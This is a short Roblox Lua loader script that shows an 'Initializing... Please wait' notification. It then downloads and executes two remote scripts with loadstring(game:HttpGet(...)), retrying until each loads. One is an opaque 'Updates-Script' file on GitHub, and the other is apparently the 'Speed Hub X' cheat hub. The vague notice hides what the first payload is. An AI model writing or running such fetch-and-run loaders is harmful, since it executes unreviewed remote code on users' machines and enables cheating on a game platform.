local StarterGui = game:GetService("StarterGui")

local function forceLoad(url)
    task.spawn(function()
        local loaded = false
        while not loaded do
            local success = pcall(function()
                return loadstring(game:HttpGet(url))()
            end)
            if success then
                loaded = true
            else
                task.wait(0.5)
            end
        end
    end)
end

-- Show quick notification
StarterGui:SetCore("SendNotification", {
    Title = "Initializing...",
    Text = "Please wait",
    Duration = 4
})

-- Load second script instantly
forceLoad("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua")

-- Wait 4 seconds then load Speed Hub
task.delay(4, function()
    forceLoad("https://rawscripts.net/raw/Universal-Script-Speed-Hub-X-27904")
end)
